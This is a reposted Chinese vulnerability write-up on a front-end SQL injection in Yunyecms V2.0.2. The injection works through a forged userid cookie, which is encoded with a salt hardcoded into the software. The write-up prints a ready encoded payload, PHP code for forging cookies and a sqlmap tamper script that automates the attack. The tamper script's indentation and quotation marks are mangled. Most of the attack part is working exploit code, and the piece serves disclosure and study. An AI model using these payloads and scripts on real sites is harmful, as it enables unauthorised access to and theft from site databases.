# Yunyecms V2.0.2 前台注入漏洞（二）

> 原文：[https://www.zhihuifly.com/t/topic/3293](https://www.zhihuifly.com/t/topic/3293)

# Yunyecms V2.0.2 前台注入漏洞（二）

## 一、漏洞简介

云业CMS内容管理系统是由云业信息科技开发的一款专门用于中小企业网站建设的PHP开源CMS，可用来快速建设一个品牌官网(PC，手机，微信都能访问)，后台功能强大，安全稳定，操作简单。

## 二、漏洞影响

yunyecms 2.0.2

## 三、复现过程

问题出现在前台`me***.php`文件中，自定义表单customform中的userid从cookie中获取，截取一段数据包可以看到cookie的userid如下：

![image](img/5c2ccbec4693120d97672527b496e52a.png)

经过了加密处理，根据解密算法**yunyecms_strdecode**可以在corefun.php找到对应的加解密算法

![image](img/3050b5f9563f88d1b4e4d47d94bdff88.png)

因为cookie里的userid可控因此我们根据算法流程我们可以在cookie中伪造userid值。还是用刚刚以上截取的userid测试。

![image](img/47c753a958061e48712be96f562e99b8.png)

可以看到真实的userid为9。构造一个SQL注入，生成如下payload：

![image](img/72008b3d369e7a2796c3bf7de8b662a1.png)

```
YmM0OWM5ZWY1ODk5ZGRkNzM0T1NjZ1lXNWtJSE5zWldWd0tEVXA4ZDdlNzk5NTliNDQyYTI1ZDE0ZWUzODZmZDI4MzY5OTM0YQ== 
```

payload生成代码front-test.php为：

```
<?php
function yunyecms_strencode($string,$salt='~^y#u%n$y^e*c%m^s^~'){
	return base64_encode(substr(md5($salt),8,18).base64_encode($string).substr(sha1($salt),0,35));
}
function yunyecms_strdecode($string,$salt='~^y#u%n$y^e*c%m^s^~'){
	$retstr=base64_decode($string);
	$SHA1salt=substr(sha1($salt),0,35);
	$md5salt=substr(md5($salt),8,18);
    $retstr=substr($retstr,strlen($md5salt));
    $retstr=substr($retstr,0,(strlen($retstr)-strlen($SHA1salt)));
	return base64_decode($retstr);
}
if ($_GET['cookie']) {
	$string=$_GET['cookie'];
	$userid=yunyecms_strdecode($string);
	echo $userid;
}
if($_GET['userid']){
	$string=$_GET['userid'];
	$cookie=yunyecms_strencode($string);
	echo $cookie;
} 
```

继续追溯可控的userid,可以看到userid经过步骤`3->4->5`传递到了pagelist函数中

![image](img/0a2b1d531eaa7050072a5a2941fd9441.png)

跟入pagelist函数，将$where拼接到了sql查询语句中$sqlcnt,然后交给了前几次SQL注入都出现的SQL查询函数**GetCount**中。

![image](img/1cbc4e8dbb3f925767f4e6e4666a743b.png)

详细查看下该函数，直接进行了sql查询。

![image](img/2d015afa15854cb9c44c19f6ee663639.png)

附上截

![image](img/f9bb9af3c6eaa6a8bf38233ac824b272.png)

手工有点麻烦，又想丢入sqlmap怎么办，由于userid经过了加密和编码处理，于是根据算法流程写一个tamper就可以很好的解决了，

![image](img/1e186f38e62a2268cb817da5979fe8c0.png)

对应tamper的的脚本为

```
yunyecms_front_sqli_tamp.py
#!/usr/bin/env python

“”"

Copyright © 2006-2018 sqlmap developers ([http://sqlmap.org/](http://sqlmap.org/))

See the file ‘LICENSE’ for copying permission

“”"

import base64

import hashlib

from lib.core.enums import PRIORITY

from lib.core.settings import UNICODE_ENCODING

**priority** = PRIORITY.LOW

def dependencies():

pass

def md5(data):

hash_md5 = hashlib.md5(data)

md5data=hash_md5.hexdigest()[8:18]

return md5data

def sha1(data):

string_sha1=hashlib.sha1(data).hexdigest()[0:35]

return string_sha1

def yunyecms_strencode(string):

salt=’~^y#u%n$y^e*c%m^s^~’

return base64.b64encode(md5(salt)+base64.b64encode(string)+sha1(salt))

def tamper(payload, **kwargs):

“”"

Base64-encodes all characters in a given payload

```
&gt;&gt;&gt; tamper("1' AND SLEEP(5)#")
'MScgQU5EIFNMRUVQKDUpIw=='
"""

return yunyecms_strencode(payload) if payload else payload 
``` 
```